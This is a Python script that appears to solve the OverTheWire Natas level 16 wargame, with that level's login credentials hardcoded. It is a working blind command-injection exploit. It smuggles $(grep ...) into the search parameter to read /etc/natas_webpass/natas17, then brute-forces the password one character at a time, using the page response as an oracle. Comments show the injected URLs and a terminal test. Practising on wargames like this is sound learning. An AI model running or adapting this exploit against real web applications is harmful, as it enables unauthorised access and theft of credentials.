import requests
import string
from requests.auth import HTTPBasicAuth
from urllib.parse import quote

auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
ignore_characters = [';', '|', '%', '`', '\\', '\'', '"']
special_characters = ['_', '%', '?', '\\', '^', '"', '\'', '-', '*', '&', '<', '>']
host = 'natas16.natas.labs.overthewire.org'
filter_word = 'Augusts'

# http://natas16.natas.labs.overthewire.org/?needle=Augusts%24%28grep++%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search
# http://natas16.natas.labs.overthewire.org/?needle=grep a /etc/natas_webpass/natas17&submit=Search
# Augusts$(grep a /etc/natas_webpass/natas17)
"""
    kali@kali:~/wargame$ grep -i p$(grep ^p test2) test
    kali@kali:~/wargame$ grep -i p$(grep ^a test2) test
    pannekake
"""

def get_password(password):
    return quote(f'{filter_word}$(grep ^{password} /etc/natas_webpass/natas17)')

def bruteforce(password):
    req = requests.get(f'http://{host}/?needle={get_password(password)}', auth=auth)
    if filter_word in req.text:
        return False
    else:
        return True

password = ''
while True:
    if bruteforce(f'{password}$'):
        break
    for i in range(48, 126):
        current = ''
        if chr(i) in ignore_characters:
            continue
        
        if chr(i) in special_characters:
            current = f'\{chr(i)}'
        else:
            current = f'{chr(i)}'
        found_char = bruteforce(f'{password}{current}')
        print(f'\r{password}{current}', flush=False, end=' ')
        if found_char:
            password += current
            break
